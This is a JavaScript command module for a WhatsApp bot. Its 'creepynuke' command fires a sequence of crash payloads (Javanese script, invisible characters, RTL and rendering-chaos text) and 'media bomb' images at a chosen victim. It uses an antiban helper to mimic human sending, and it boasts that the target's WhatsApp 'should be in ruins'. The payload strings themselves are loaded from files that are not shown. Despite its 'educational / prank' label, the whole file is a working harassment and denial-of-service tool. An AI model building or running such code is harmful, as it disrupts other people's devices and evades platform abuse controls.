/**
 * 🐛 Tech God Bug 2026 — Creepy Nuke (All Payloads Combined)
 * The ultimate CREEPY attack — fires ALL payload types in sequence.
 * Combines Javanese, invisible chars, RTL, and rendering chaos.
 * ⚠️ EDUCATIONAL / PRANK USE ONLY
 * By Dev-Ntando (payload source: CREEPY_MD-V1)
 */
'use strict';

const config  = require('../../config');
const antiban = require('../../utils/antiban');
const db      = require('../../database');
const fs      = require('fs');
const path    = require('path');

// Load ALL creepy payloads
const { creepyd1 } = require('./creepy-data/creepyd1');
const { creepyd2 } = require('./creepy-data/creepyd2');
const { creepyd3 } = require('./creepy-data/creepyd3');
const { creepyd4 } = require('./creepy-data/creepyd4');
const { creepyd6 } = require('./creepy-data/creepyd6');
const { creepyd8 } = require('./creepy-data/creepyd8');
const { creepyd9 } = require('./creepy-data/creepyd9');
const { creepyd11 } = require('./creepy-data/creepyd11');

const allPayloads = [creepyd1, creepyd2, creepyd3, creepyd4, creepyd6, creepyd8, creepyd9, creepyd11].filter(Boolean);

module.exports = async (sock, msg, args, { isOwner, sender, jid }) => {
  // Owner only — this is the nuclear option
  if (!isOwner) {
    return antiban.sendHuman(sock, jid, { text: '👑 *Creepy Nuke is owner-only.* Too powerful for regular users.' }, { quoted: msg });
  }

  if (!config.bugsEnabled.crash) {
    return antiban.sendHuman(sock, jid, { text: '❌ Crash bugs are currently disabled.' }, { quoted: msg });
  }

  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  let target = mentioned[0] || (args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);

  if (!target) {
    return antiban.sendHuman(sock, jid, {
      text: `☢️ *Creepy Nuke*\n\n*Usage:* ${config.prefix}creepynuke @user\n*Example:* ${config.prefix}creepynuke @someone\n\n_Fires ALL CREEPY payloads in sequence._\n_Javanese + Invisible + RTL + Rendering chaos._\n\n⚠️ *Owner only. Use with caution.*`,
    }, { quoted: msg });
  }

  await antiban.sendHuman(sock, jid, {
    text: `☢️ *CREEPY NUKE INCOMING...*\n🎯 Target: @${target.split('@')[0]}\n💣 Payloads: ${allPayloads.length}\n⚡ Type: FULL ARSENAL\n\n_Launching all payloads..._`,
    mentions: [target]
  }, { quoted: msg });

  let sent = 0;
  for (const payload of allPayloads) {
    try {
      const text = typeof payload === 'function' ? payload(config.prefix) : payload;
      await sock.sendMessage(target, { text });
      sent++;
      await new Promise(r => setTimeout(r, 700));
    } catch (e) {
      // Skip failed payload, continue
    }
  }

  // Also send media bombs if available
  const mediaDir = path.join(__dirname, 'creepy-data');
  const mediaFiles = ['x.webp', 'xx1.png', 'xx2.jpg'];
  for (const file of mediaFiles) {
    try {
      const filePath = path.join(mediaDir, file);
      if (fs.existsSync(filePath)) {
        const buffer = fs.readFileSync(filePath);
        if (file.endsWith('.webp')) {
          await sock.sendMessage(target, { sticker: buffer });
        } else {
          await sock.sendMessage(target, { image: buffer, caption: '🐛' });
        }
        sent++;
        await new Promise(r => setTimeout(r, 400));
      }
    } catch (e) { /* skip */ }
  }

  db.incrementStat('totalBugs');
  db.incrementUserStat(sender, 'bugs');

  await antiban.sendHuman(sock, jid, {
    text: `☢️ *CREEPY NUKE COMPLETE!*\n🐛 ${sent} payloads delivered to @${target.split('@')[0]}\n_Their WhatsApp should be in ruins._`,
    mentions: [target]
  }, { quoted: msg });
};
